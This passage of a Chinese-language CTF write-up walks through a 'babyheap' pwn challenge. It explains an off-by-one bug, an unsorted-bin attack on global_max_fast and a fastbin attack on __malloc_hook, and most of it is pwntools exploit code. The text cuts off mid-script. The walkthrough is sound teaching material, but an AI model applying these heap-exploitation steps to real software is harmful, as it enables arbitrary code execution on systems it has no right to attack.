class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">alarm</span><span class="token punctuation">(</span><span class="token number">0x3Cu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">mallopt</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"WELCOME!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>其中的mallopt(1,0)规定了global_max_fast的大小为0，这样即是限制了fastbin的最大大小为0，即不允许使用fastbin<br>再看到add函数</p><pre class=" language-c"><code class="language-c">v2 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">0xF</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>qword_202060<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      v2 <span class="token operator">=</span> i<span class="token punctuation">;</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Error: Don't have enough space!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"size: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token function">sub_B0A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">||</span> v3 <span class="token operator">></span> <span class="token number">0x6F</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"The size is wrong!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  qword_202060<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"data: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_A8A</span><span class="token punctuation">(</span>qword_202060<span class="token punctuation">[</span>v2<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Success!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>最大允许add chunk16次，并且允许申请的最大的chunk大小为0x6f</p><p>delete函数</p><pre class=" language-c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v1 <span class="token operator">=</span> <span class="token function">sub_B0A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>v1 <span class="token operator">&amp;</span> <span class="token number">0x80000000</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">||</span> v1 <span class="token operator">></span> <span class="token number">0xF</span> <span class="token operator">||</span> <span class="token operator">!</span>qword_202060<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Error: Invalid index!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>qword_202060<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>qword_202060<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Success!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>delete函数没有问题，free之后同时将指针清零</p><p>edit函数</p><pre class=" language-c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v2 <span class="token operator">=</span> <span class="token function">sub_B0A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>v2 <span class="token operator">&amp;</span> <span class="token number">0x80000000</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">||</span> v2 <span class="token operator">></span> <span class="token number">0xF</span> <span class="token operator">||</span> <span class="token operator">!</span>qword_202060<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Error: Invalid index!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"data: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v0 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>qword_202060<span class="token punctuation">[</span>v2<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">sub_A8A</span><span class="token punctuation">(</span>qword_202060<span class="token punctuation">[</span>v2<span class="token punctuation">]</span><span class="token punctuation">,</span> v0<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Success!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>其中的sub_A8A存在off-by-one漏洞<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/3.jpg" alt=""></p><p>show函数</p><pre class=" language-c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v1 <span class="token operator">=</span> <span class="token function">sub_B0A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>v1 <span class="token operator">&amp;</span> <span class="token number">0x80000000</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">||</span> v1 <span class="token operator">></span> <span class="token number">0xF</span> <span class="token operator">||</span> <span class="token operator">!</span>qword_202060<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Error: Invalid index!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>qword_202060<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Success!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>没什么好说的，通过序号输出chunk的内容</p><p>整理一下我们的信息<br>1.无法使用fastbin attack<br>2.最大只允许分配0x6f大小的chunk<br>3.存在off-by-one漏洞<br>大概思路如下:通过unsorted bin attack修改global_max_fast的大小，是fastbin开启，然后通过fastbin attack修改malloc_hook为one_gadget</p><p>先封装好我们要用到的一些函数</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>首先让我们来泄露libc基地址<br>我们创建5个chunk，第一个用来off-by-one，第二三四个用来合并，第五个防止前面的chunk和topchunk合并<br>我们将chunk1(编号从0开始)的size修改为chunk123的和，然后free掉，再add一个chunk1大小的chunk，这样main_arena的地址就到了chunk2里面，然后show(2)即可leak出地址</p><pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0xa1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3c4b78</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"libc_base => {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>global_max_fast <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x3c67f8</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"global_max_fast => {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>global_max_fast<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>__malloc_hook_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>__libc_realloc_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__libc_realloc'</span><span class="token punctuation">]</span>one_gadget_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>one_gadgetlog<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"__malloc_hook_addr => {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>__malloc_hook_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"__libc_realloc_addr => {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>__libc_realloc_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"one_gadget_addr => {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>one_gadget_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>有了libc基地址之后，我们就进行下一步，修改global_max_fast<br>我们需要将某个free掉的chunk的bk指针修改为global_max_fast-0x10处，这就需要构造fake chunk，即house of sprit技术(直接通过overlap行不通，因为这题edit的长度是原chunk输入内容的长度，而输入内容的长度是通过strlen函数判断的，遇到’\x00’就会截至)<br>我们先将chunk恢复原状</p><pre class=" language-python"><code class="language-python"><span class="token triple-quoted-string string">'''add(0x18, 'a'*0x18)add(0x28, 'a')add(0x38, 'a')add(0x28, 'a')add(0x18, 'a'*0x18)edit(0, 'a'*0x18+p8(0xa1))free(1)add(0x28, 'a')show(2)'''</span>add<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0xa1</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>然后进行如下操作</p><pre class=" language-python"><code class="language-python">free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">40</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>至于为什么这么操作，我们进入gdb看看<br>首先是free(1)之后<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/5.jpg" alt=""><br>接着构造我们的fakechunk<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/6.jpg" alt=""><br>接着将unsorted bin中剩下的0x50大小的chunk也分配出来，然后依次free掉我们刚刚add的chunk</p><pre class=" language-python"><code class="language-python">free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#这里实际上free的是我们的fakechunk</span></code></pre><p>我们再进到gdb看看<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/7.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/8.jpg" alt=""><br>可以看到我们的fakechunk确实被放入了unsortedbin中，并且由于fakechunk的fd和bk指针都包含在chunk1中，所以我们可重新分配chunk1，然后将fakechunk的bk指针修改</p><pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">40</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>global_max_fast<span class="token number">-0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span></code></pre><p><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/9.jpg" alt=""><br>可以看到global_max_fast的值变成了main_arena的地址，也就是说我们接下来就可以使用fastbin了<br>最后的fastbin attack也利用了house of sprit技术，就不多赘述了，下面是完整exp</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./babyheap'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># io=remote('nc.eonew.cn',10502)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'babyheap'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-2.23.so'</span><span class="token punctuation">)</span>one_gadget <span class="token operator">=</span> <span class="token number">0x4526a</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">9</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0xa1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3c4b78</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"libc_base => {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>global_max_fast <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x3c67f8</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"global_max_fast => {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>global_max_fast<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>__malloc_hook_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>__libc_realloc_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__libc_realloc'</span><span class="token punctuation">]</span>one_gadget_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>one_gadgetlog<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"__malloc_hook_addr => {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>__malloc_hook_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"__libc_realloc_addr => {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>__libc_realloc_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"one_gadget_addr => {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>one_gadget_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0xa1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">40</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">40</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>global_max_fast<span class="token number">-0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p8<span class="token 